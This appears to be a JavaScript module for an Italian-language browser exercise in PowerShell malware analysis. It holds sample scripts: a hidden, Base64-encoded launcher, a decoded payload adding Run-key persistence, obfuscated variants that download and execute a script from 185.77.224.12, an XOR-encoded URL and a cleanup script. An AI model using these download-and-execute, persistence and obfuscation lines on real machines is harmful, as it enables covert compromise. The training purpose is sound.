// Tutti gli script sono FINTI, mostrati solo a scopo didattico dentro il browser.
// Nessuno di essi viene realmente eseguito.

export const HELLO_PS = `# hello.ps1 — il tuo primo script PowerShell
$nome = "analista"
Write-Host "Ciao $nome, oggi è $(Get-Date -Format 'dd/MM/yyyy')"
`;

// Script "trovato" sul PC di un utente. In alto un launcher innocuo,
// dentro un blocco Base64 che è la vera parte cattiva.
export const SUSPICIOUS_LAUNCHER = `# update.ps1 — trovato in C:\\Users\\marco\\Downloads
# Eseguito automaticamente dallo Scheduler "WindowsUpdateHelper"
powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand \\
  JABwAD0AJwBIAEsAQwBVADoAXABTAG8AZgB0AHcAYQByAGUAXABNAGkAYwByAG8AcwBvAGYAdABc\\
  AFcAaQBuAGQAbwB3AHMAXABDAHUAcgByAGUAbgB0AFYAZQByAHMAaQBvAG4AXABSAHUAbgAnADsA\\
  UwBlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AUABhAHQAaAAgACQAcAAgAC0ATgBh\\
  AG0AZQAgACcATwBuAGUARAByAGkAdgBlAFMAeQBuAGMAJwAgAC0AVgBhAGwAdQBlACAAJwBwAG8A\\
  dwBlAHIAcwBoAGUAbABsACAALQBOAG8AUAAgAC0AVwAgAEgAIAAtAEUAIABiAHkAcABhAHMAcwAg\\
  AC0AYwAgACIAaQB3AHIAIABoAHQAdABwADoALwAvADEAOAA1AC4ANwA3AC4AMgAyADQALgAxADIA\\
  LwBhAC4AcABzADEAIAAtAE8AdQB0AEYAaQBsAGUAIAAkAGUAbgB2ADoAVABFAE0AUABcAGEALgBw\\
  AHMAMQA7ACAALgAgACQAZQBuAHYAOgBUAEUATQBQAFwAYQAuAHAAcwAxACIAJwA=
`;

// La stringa Base64 decodificata (UTF-16 LE): il vero payload.
// Nota: la mostriamo come stringa già decodificata; nel task 3 la deriviamo dal blocco.
export const DECODED_PAYLOAD = `$p='HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run';Set-ItemProperty -Path $p -Name 'OneDriveSync' -Value 'powershell -NoP -W H -E bypass -c "iwr http://185.77.224.12/a.ps1 -OutFile $env:TEMP\\a.ps1; . $env:TEMP\\a.ps1"'`;

// Base64 “grezzo” senza a-capo, esattamente ciò che l'utente deve incollare.
export const B64_STRING =
  "JABwAD0AJwBIAEsAQwBVADoAXABTAG8AZgB0AHcAYQByAGUAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABDAHUAcgByAGUAbgB0AFYAZQByAHMAaQBvAG4AXABSAHUAbgAnADsAUwBlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AUABhAHQAaAAgACQAcAAgAC0ATgBhAG0AZQAgACcATwBuAGUARAByAGkAdgBlAFMAeQBuAGMAJwAgAC0AVgBhAGwAdQBlACAAJwBwAG8AdwBlAHIAcwBoAGUAbABsACAALQBOAG8AUAAgAC0AVwAgAEgAIAAtAEUAIABiAHkAcABhAHMAcwAgAC0AYwAgACIAaQB3AHIAIABoAHQAdABwADoALwAvADEAOAA1AC4ANwA3AC4AMgAyADQALgAxADIALwBhAC4AcABzADEAIAAtAE8AdQB0AEYAaQBsAGUAIAAkAGUAbgB2ADoAVABFAE0AUABcAGEALgBwAHMAMQA7ACAALgAgACQAZQBuAHYAOgBUAEUATQBQAFwAYQAuAHAAcwAxACIAJwA=";

export const CONCAT_SCRIPT = `# variante offuscata: la stringa 'Invoke-Expression' è spezzata
$a = 'In'+'vo'+'ke-Ex'+'pre'+'ssion'
$b = 'Ne'+'w-Ob'+'ject'
& (Get-Command $a) ((& (Get-Command $b) Net.WebClient).DownloadString('http://185.77.224.12/a.ps1'))
`;

export const CHARCODE_SCRIPT = `# variante offuscata: nomi cmdlet ricostruiti da array di byte
$c = [char[]](73,110,118,111,107,101,45,69,120,112,114,101,115,115,105,111,110) -join ''
$u = [char[]](104,116,116,112,58,47,47,49,56,53,46,55,55,46,50,50,52,46,49,50,47,97,46,112,115,49) -join ''
& $c ((New-Object Net.WebClient).DownloadString($u))
`;

// XOR: stringa cifrata con chiave singola (byte 42 = '*').
export const XOR_KEY = 42;
export const XOR_PLAIN = "http://185.77.224.12/a.ps1";
export const XOR_BYTES = Array.from(XOR_PLAIN).map((c) => c.charCodeAt(0) ^ XOR_KEY);

export const REVERSE_SCRIPT_EXPECTED = `# clean.ps1 — annulla la persistenza creata da update.ps1
$p = 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run'
Remove-ItemProperty -Path $p -Name 'OneDriveSync' -ErrorAction SilentlyContinue
Remove-Item -Path "$env:TEMP\\a.ps1" -Force -ErrorAction SilentlyContinue
Write-Host "Persistenza rimossa." -ForegroundColor Green
`;
